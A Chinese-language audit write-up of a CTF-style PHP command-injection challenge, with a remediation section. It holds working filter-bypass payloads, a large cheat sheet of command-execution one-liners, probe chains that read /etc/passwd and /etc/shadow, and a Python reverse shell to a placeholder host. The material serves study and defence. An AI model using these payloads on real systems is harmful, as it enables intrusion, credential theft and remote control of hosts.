# 命令注入 — 空格与关键字过滤的多重绕过

## 审计源码

```php
<?php
// 后端核心代码
$ip = $_GET['ip'];

if (preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)) {
    die("fxck your symbol!");
} else if (preg_match("/ /", $ip)) {
    die("fxck your space!");
} else if (preg_match("/bash/", $ip)) {
    die("fxck your bash!");
} else if (preg_match("/.*f.*l.*a.*g.*/", $ip)) {
    die("fxck your flag!");
}

$a = shell_exec("ping -c 4 " . $ip);
echo "<pre>";
print_r($a);
?>
```

---

## 审计分析

### 结论

`shell_exec("ping -c 4 " . $ip)` 将用户输入直接拼接到系统命令中执行，存在典型的命令注入漏洞。代码设置了四层过滤：符号过滤、空格过滤、bash 过滤、flag 字符串顺序匹配。但每层都有绕过方法，且过滤之间缺乏组合防御能力。

### Source -> Sink 追踪

```
Source: $_GET['ip'] (用户完全可控)
  ↓
Sanitization: 四层正则黑名单，每层都有绕过方式，无一充分
  1. /[\&\/\?\*<>...]/ — 符号过滤，可绕过
  2. / / — 空格过滤，可绕过（${IFS}、$IFS$9、tab 等）
  3. /bash/ — 关键字过滤，用 sh 替代
  4. /.*f.*l.*a.*g.*/ — flag 字符串顺序匹配，可用变量拼接或编码绕过
  ↓
Sink: shell_exec("ping -c 4 " . $ip)
```

### 逐层过滤分析与绕过

#### 第一层：符号过滤

```
/&|\/|\?|\*|<|[\x{00}-\x{20}]|>|'|"|\\|\(|\)|\[|\]|\{|\}/
```

过滤了 `&`, `/`, `?`, `*`, `<`, `>`, `'`, `"`, `\`, 括号和花括号，以及 ASCII 0x00-0x20（含空格、tab、换行等控制字符）。

**影响**：不能用 `>` 重定向输出、不能用反斜线转义、不能直接用 tab（0x09 在 0x00-0x20 范围内）。

**绕过思路**：用 `;` 分隔命令（分号未被过滤），用内联执行 `` ` `` `` ` `` 替代文件读取。

#### 第二层：空格过滤

```
/ /
```

只匹配字面空格（0x20），但第一层已经把 0x00-0x20 全过滤了，tab 也进不来。不过以下方法有效：

| 方法 | 示例 | 原理 |
|------|------|------|
| `${IFS}` | `cat${IFS}flag.php` | `$IFS` 是 shell 内部字段分隔符，默认为空格+tab+换行 |
| `$IFS$9` | `cat$IFS$9flag.php` | `$9` 是空的位置参数，用于分隔 `${IFS}` 和下一个字符，`$1` 到 `$9` 均可 |
| `{cat,flag.php}` | `{cat,flag.php}` | Bash brace expansion，逗号充当空格，注意花括号需要在第一层过滤中未被拦截的场景 |
| `X=$'cat\x09./flag.php';$X` | 同上 | 用 `$'...'` 语法在赋值时内嵌转义字符 tab（`\x09`），但本题过滤了单引号和反斜线，此方法不适用 |

本题有效的方法是 `$IFS$9` 和内联执行 `` ` `` `` ` ``。

#### 第三层：bash 过滤

```
/bash/
```

简单：用 `sh` 替代 `bash`。

#### 第四层：flag 字符串顺序匹配

```
/.*f.*l.*a.*g.*/
```

这是最关键的限制——输入中按顺序出现 f、l、a、g 四个字母就拦截。

##### 有效绕过：变量拼接

```
?ip=127.0.0.1;X=g;cat$IFS$9fla$X.php
```

`fla` 写在输入中，不含 f-l-a-g 顺序。变量 `$X` 的值是 `g`，拼接后形成 `flag`。由于 `$X` 后面紧跟着 `.php` 中的 `.`，shell 能正确识别变量名为 `X` 而非 `X.php`。

##### 无效的尝试

```
?ip=127.0.0.1;X=a;cat$IFS$9fl$Xg.php
?ip=127.0.0.1;X=la;cat$IFS$9f$Xg.php
```

失败原因：`$Xg` 被 shell 当成一个名为 `Xg` 的变量解析，而该变量未定义，结果为空。实际 cat 的文件变成 `flg.php` 或 `fg.php`，文件不存在。

**变量拼接的核心原则**：变量 `$X` 后面必须跟一个不能构成合法变量名字符的字符。`.`（点）是一个，空格/分隔符也是。

##### 有效绕过：base64 编码 + sh

```
?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
```

- `Y2F0IGZsYWcucGhw` 是 `cat flag.php` 的 base64 编码
- 输入中不包含 f-l-a-g 顺序（编码后的字符打乱了顺序）
- 用 `sh` 代替 `bash` 执行解码结果

### 攻击链

1. 攻击者构造 payload，用 `;` 分隔出额外命令，用 `$IFS$9` 替代空格
2. 通过 GET 参数 `?ip=` 传入，URL 编码处理特殊字符
3. 四层正则逐个被绕过：符号过滤未覆盖 `;` `$` 等；空格用 `$IFS$9`；bash 用 sh；flag 用变量拼接或编码
4. `shell_exec()` 执行拼接后的命令，结果回显到页面

### 修复方案

**根本修复：不要用 `shell_exec` 执行用户输入。**

1. **使用安全的 API**：PHP 有内置的 `exec` 系列函数，但最安全的是完全不调用系统命令。对于 ping，可以限制为只允许 IP 地址格式的输入，用 `filter_var($ip, FILTER_VALIDATE_IP)` 校验
2. **白名单 + 类型约束**：
   ```php
   if (!filter_var($ip, FILTER_VALIDATE_IP)) {
       die("Invalid IP address");
   }
   shell_exec("ping -c 4 " . escapeshellarg($ip));  // 仅作为额外防护
   ```
3. **`escapeshellarg()` 不能完全依赖** — 它会把整个参数包在单引号里，但在这个场景中 IP 已经是拼接进命令字符串而非单独参数，escapeshellarg 无法恢复已破损的命令结构。正确做法是先校验再拼接
4. **如果必须允许复杂命令结构**（极少情况）：用 HMAC 签名校验输入未被篡改，但这是最后手段

### 总结：绕过方法速查

**空格绕过**
- `${IFS}`
- `$IFS$9`（`$1` 到 `$9` 均可）
- `$IFS$1`
- `<` 重定向（本题被过滤）
- `<>` 重定向（本题被过滤）
- `{cat,flag.php}` （花括号在本题被过滤）
- `%20` （仅 URL 编码层面，shell 不直接支持）
- `%09` tab（仅 URL 编码层面，shell 不直接支持）
- `X=$'cat\x09./flag.php';$X`（`\x09`=tab, `\x20`=空格，本题反斜线被过滤不适用）

**内联执行**
- `` cat `ls` `` — 用反引号将 ls 的输出作为 cat 的参数

**变量赋值拼接**
- `X=g;cat$IFS$9fla$X.php`
- 变量后面必须跟不能构成变量名的字符（`.` 逗号 `/` 空格等），否则会被解析为新变量名

**base64 编码绕过**
- `echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh`
- `echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|bash`

**Hex 编码绕过（需安装 xxd）**
- `echo 63617420666c61672e706870|xxd -r -p|bash`
- `echo 63617420666c61672e706870|xxd -r -p|sh`

**通配与引号绕过（部分在本题被过滤）**
- `cat fl*` — 用 `*` 匹配任意字符
- `ca\t fla\g.php` — 反斜线转义
- `cat fl''ag.php` — 两个单引号插入
- `cat fl[a]g.php` — 用 `[]` 匹配单个字符
- `cp fla{g.php,G}` — 复制后直接读
- `ca${21}t a.txt` — `{}` 中可以是任意数字

### RCE 检测命令速查与绕过

探测命令注入/RCE 漏洞时，先用以下基础命令验证漏洞存在，再逐步扩展。如果某个命令被过滤，使用对应的替代方案。

#### 文件读取

| 命令 | 说明 | 被过滤时的替代 |
|------|------|--------------|
| `cat file` | 最常用的读取 | `tac file` / `nl file` / `more file` / `less file` / `head file` / `tail file` / `rev file \| rev` |
| `tac file` | 反向输出（按行倒序） | 同 cat 的替代 |
| `nl file` | 带行号输出 | `cat -n file` / `less -N file` |
| `more file` | 逐页查看 | `less file` |
| `less file` | 逐页查看（可回滚） | `more file` |
| `head -n 99 file` | 输出前 N 行 | `sed -n '1,99p' file` / `awk 'NR<=99' file` |
| `tail -n 99 file` | 输出后 N 行 | `sed -n '$p' file` 或 `awk 'END{print}' file`（仅最后一行） |
| `rev file \| rev` | 反转两次 = 正常输出 | 等价 cat，绕过 cat 关键字过滤 |
| `dd if=file` | 底层读取 | `dd if=file bs=1 count=9999` |
| `sort file` | 排序输出 | 不会输出原样，但可看到内容 |
| `uniq file` | 去重输出 | 配合 sort 使用 |
| `od -c file` | 八进制/ASCII dump | `xxd file` / `hexdump -C file` |
| `strings file` | 提取可打印字符 | `od -c file \| grep -oP '\w+'` |
| `fold -w1 file` | 每行一个字符 | `grep -o . file` |

**cat 被过滤时的通用替代**（推荐度从高到低）：

```
tac file          # 反向 cat，最常用替代
nl file           # 带行号
more file         # 逐页
less file         # 逐页
head -n 999 file  # 如果行数不够，改大数字
tail -n 999 file
rev file | rev    # 双重反转
dd if=file        # 底层读取
sort file         # 排序（内容顺序会变）
```

**完全无法使用任何文件读取命令时的终极方案**：

```
# 用 shell 内建命令（builtin）
while read line; do echo $line; done < file

# 用 source / . 引入（仅 shell 脚本）
source file     # 会将文件内容当作命令执行，有风险
. file          # 同上

# 用 printf + 重定向
printf '%s\n' "$(<file)"

# bash 内建 mapfile
mapfile -t arr < file; printf '%s\n' "${arr[@]}"
```

#### 目录/文件列表

| 命令 | 说明 | 被过滤时的替代（Linux） | 被过滤时的替代（Windows） |
|------|------|------------------------|--------------------------|
| `ls` | 列出目录 | `dir` / `find . -maxdepth 1` / `echo *` / `printf '%s\n' *` / `stat -c '%n' *` / `tree -L 1` | `dir` |
| `ls -la` | 列出含隐藏文件 | `find . -maxdepth 1 -printf '%M %n %u %g %s %p\n'` / `stat -c '%A %n' *` | `dir /a` |
| `dir` | 列出目录（同 ls） | `ls` | `ls`（如果装了 PowerShell/WSL） |
| `find .` | 递归列出所有文件 | `tree` / `ls -R` | `tree` / `dir /s` |
| `tree` | 树形列出目录 | `find . \| sort` / `ls -R` | `dir /s` |

**ls 被过滤的通用替代**：

```
echo *                  # 最简单：shell glob 展开，仅当前目录
printf '%s\n' *         # 每行一个（比 echo * 更清晰）
dir                     # Windows 和 Linux 都可用
find . -maxdepth 1      # find 替代
stat -c '%n' *          # stat 替代
ls -R                   # 如果有 R 但 ls 未被过滤时递归
echo */                 # 仅列出子目录
echo .*                 # 仅列出隐藏文件
```

#### 当前用户/身份

| 命令 | 说明 | 被过滤时的替代 |
|------|------|--------------|
| `whoami` | 当前用户名 | `id -un` / `echo $USER` / `echo $LOGNAME` / `printenv USER` / `who am i`（旧式语法）|
| `id` | 用户ID和组 | `whoami; groups` 组合 / `echo $UID:$GROUPS` |
| `who` | 当前登录的用户列表 | `w` / `users` / `last \| grep "still logged in"` |
| `w` | 谁在登录+在做什么 | `who -a` / `ps -ef \| grep -v grep \| grep -E 'ssh|bash|login'` |
| `users` | 简短的登录用户列表 | `who \| awk '{print $1}' \| sort -u` |
| `last` | 最近登录记录 | `lastlog` / `cat /var/log/auth.log 2>/dev/null` |
| `groups` | 当前用户的组 | `id -Gn` / `id -Gn \| tr ' ' ','` |

**whoami 被过滤的通用替代**（推荐度从高到低）：

```
id -un                 # id 打印用户名
echo $USER             # 环境变量
echo $LOGNAME          # 另一个环境变量
printenv USER          # 查看环境变量
who am i               # 旧式写法
id | sed 's/ .*//'    # 解析 id 输出
cat /etc/passwd | grep $(id -u)   # 从 passwd 文件读取
```

**Windows 下用户信息**：

```
whoami /all            # 最全面的用户信息
echo %USERNAME%        # 环境变量
net user %USERNAME%    # 详细用户信息
net user               # 所有用户列表
qwinsta                # 终端会话信息
query user             # 同上
```

#### 当前目录

| 命令 | 说明 | 被过滤时的替代 |
|------|------|--------------|
| `pwd` | 打印当前工作目录 | `echo $PWD` / `readlink -f .` / `realpath .` / `pwd -L` / 旧式 `` `pwd` `` |
| `echo $PWD` | 通过环境变量获取 | 不需要 pwd 命令 |
| `readlink -f .` | 解析符号链接获取绝对路径 | 等同于 `pwd` |
| `realpath .` | 同上 | 等同于 `pwd` |

**Windows 下获取当前目录**：

```
cd                     # 无参数时显示当前目录
echo %CD%              # 环境变量
chdir                  # 同 cd
```

#### 主机名/系统信息

| 命令 | 说明 | 被过滤时的替代 |
|------|------|--------------|
| `hostname` | 主机名 | `cat /etc/hostname` / `echo $HOSTNAME` / `uname -n` / `sysctl kernel.hostname 2>/dev/null` / `hostnamectl` |
| `uname -a` | 系统信息 | `cat /proc/version` / `cat /etc/os-release` / `cat /etc/issue` / `hostnamectl` |
| `uname -r` | 内核版本 | `cat /proc/version` |
| `cat /proc/version` | Linux 版本信息 | `uname -a` / `cat /etc/issue` |
| `cat /etc/os-release` | 发行版信息 | `cat /etc/*release` / `lsb_release -a` |

**Windows 下系统信息**：

```
systeminfo             # 最全面的系统信息
ver                    # 系统版本
hostname               # 主机名
echo %COMPUTERNAME%    # 主机名（环境变量）
wmic os get *          # 操作系统详细信息（旧版）
Get-ComputerInfo       # PowerShell
```

#### 网络信息

| 命令 | 说明 | 被过滤时的替代 |
|------|------|--------------|
| `ifconfig` | 网络接口配置 | `ip addr` / `ip a` / `hostname -I` / `cat /etc/hosts` |
| `ip addr` | 现代 Linux 网络配置 | `ifconfig` / `hostname -I` / `cat /proc/net/fib_trie 2>/dev/null` |
| `netstat -an` | 端口监听+连接 | `ss -an` / `lsof -i -P -n` / `cat /proc/net/tcp` |
| `ss -an` | 现代 Linux socket 统计 | `netstat -an` / `cat /proc/net/tcp` |
| `ping` | 网络连通性 | `wget -q -O- --timeout=1 http://target` / `curl --connect-timeout 1 target` / `nc -zv target port` |

#### 进程信息

| 命令 | 说明 | 被过滤时的替代 |
|------|------|--------------|
| `ps aux` | 所有进程列表 | `ps -ef` / `top -n1 -b` / `cat /proc/[0-9]*/cmdline \| tr '\0' '\n'` / `pstree -p` |
| `ps -ef` | 同上（BSD风格） | `ps aux` |
| `top -n1 -b` | 快照一次进程信息 | `ps aux` / `htop -n1` |
| `pgrep -a .` | 通过进程名搜索 | `ps aux \| grep ...` |

**Windows 下进程信息**：

```
tasklist               # 进程列表
tasklist /v            # 详细进程列表
wmic process list full # 进程详细信息（旧版）
Get-Process            # PowerShell
```

#### 命令执行（当主命令被过滤）

| 被过滤 | 替代方案 |
|--------|---------|
| `bash -c cmd` | `sh -c cmd` / `ash -c cmd` / `dash -c cmd` / `zsh -c cmd` / `php -r 'system("cmd");'` / `python -c 'import os;os.system("cmd")'` / `perl -e 'system("cmd")'` / `ruby -e 'system("cmd")'` |
| `cmd.exe` (Windows) | `powershell -c cmd` / `pwsh -c cmd` / `cscript //nologo script.vbs` / `rundll32` |
| `php -r` | `python -c` / `perl -e` / `ruby -e` / `node -e` |
| `python -c` | `python3 -c` / `python2 -c` / `php -r` / `perl -e` / `lua -e` |
| `curl` | `wget` / `nc` / `busybox wget` / `fetch` / `lynx -dump` / `links -dump` / `telnet` / `perl -e '...'` / `python -c 'import urllib'` |
| `wget` | `curl` / `nc` / `busybox wget` / `axel` / `aria2c` |

#### 各语言一句话执行命令

```
# PHP
php -r 'system($_GET["x"]);'
php -r 'exec("id");'
php -r 'echo shell_exec("id");'
php -r 'passthru("id");'
php -r 'echo `id`;'

# Python
python -c 'import os;os.system("id")'
python -c 'import os;print(os.popen("id").read())'
python -c 'import subprocess;subprocess.call(["id"])'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("host",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'system("id")'
perl -e 'print `id`'
perl -e 'exec("id")'

# Ruby
ruby -e 'system("id")'
ruby -e 'puts `id`'
ruby -e 'exec("id")'

# Node.js
node -e 'require("child_process").execSync("id").toString()'
node -e 'require("child_process").exec("id",(e,o)=>console.log(o))'

# Lua
lua -e 'os.execute("id")'

# awk
awk 'BEGIN{system("id")}'

# busybox（多合一工具）
busybox id
busybox cat file
busybox ls
busybox sh
```

#### 常用 payload 模板

**Linux 通用探测链**（逐级验证漏洞和权限）：

```
# 第一级：验证 RCE 存在
id                              # 最快确认漏洞+当前用户
whoami                          # 仅用户名

# 第二级：探测环境
pwd                             # 当前目录
ls -la                          # 目录内容
hostname                        # 主机名
uname -a                        # 系统信息

# 第三级：探测网络
ifconfig || ip addr             # 内网IP
netstat -an || ss -an           # 端口/连接

# 第四级：尝试读取敏感文件
cat /etc/passwd                 # 用户列表
cat /etc/shadow 2>/dev/null     # 密码哈希（需root）
cat /flag                        # CTF标志
cat /flag.txt
cat flag
cat flag.txt
find / -name "flag*" 2>/dev/null

# 一键组合探测
id; pwd; ls -la; hostname; uname -a; cat /etc/passwd | head -5
```

**Windows 通用探测链**：

```
# 基础探测
whoami
echo %USERNAME%
ipconfig
hostname
ver

# 文件探测
dir
type flag.txt
type \flag.txt
type C:\flag.txt
dir /s /b C:\flag*
findstr /s /i flag C:\*

# 详细信息
whoami /all
tasklist
net user
netstat -an

# 组合
whoami && hostname && ipconfig && dir C:\
```

#### 命令连接符速查

当需要在一行中执行多个命令时：

| 符号 | 语法 | Linux | Windows | 说明 |
|------|------|-------|---------|------|
| `;` | `cmd1;cmd2` | 支持 | 支持 | 顺序执行，无关联 |
| `&&` | `cmd1&&cmd2` | 支持 | 支持 | cmd1 成功才执行 cmd2 |
| `\|\|` | `cmd1\|\|cmd2` | 支持 | 支持 | cmd1 失败才执行 cmd2 |
| `\|` | `cmd1\|cmd2` | 支持 | 支持 | cmd1 的输出作为 cmd2 的输入（管道） |
| `\n` | `cmd1%0acmd2` | 支持 | 不支持 | URL 编码的换行符，等价于 `;` |
| `&` | `cmd1&cmd2` | 后台执行 | 命令分隔 | Linux 使 cmd1 后台执行；Windows 作为分隔符使用 |
| `` ` `` | `` `cmd` `` | 支持 | 不支持 | 命令替换（内联执行） |
| `$()` | `$(cmd)` | 支持 | 不支持 | 现代命令替换，推荐 |

**连接符被过滤时的替代**：

```
;   被过滤 → 用 %0a（换行）、||、&&、|管道注入
|   被过滤 → 用 ; + 临时文件：cmd1 > /tmp/x; cmd2 < /tmp/x
&&  被过滤 → 用 ; 或 %0a
||  被过滤 → 用 ; 或 %0a
`   被过滤 → 用 $()
$() 被过滤 → 用 ``
```

### 关联知识

- **CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')**
- **OWASP A03:2021 — Injection**
- `shell_exec()`、`exec()`、`system()`、`popen()`、`` ` `` `` ` ``（反引号操作符）都是 PHP 中的命令执行 sink
- `escapeshellarg()` 和 `escapeshellcmd()` 各有局限：前者包单引号但单引号内的内容仍有利用可能；后者转义元字符但不阻止用 `|` `;` `\n` 等追加命令
- `$IFS` 是 POSIX shell 内部变量，在非 bash 环境（如 alpine 的 ash、busybox sh）中同样有效
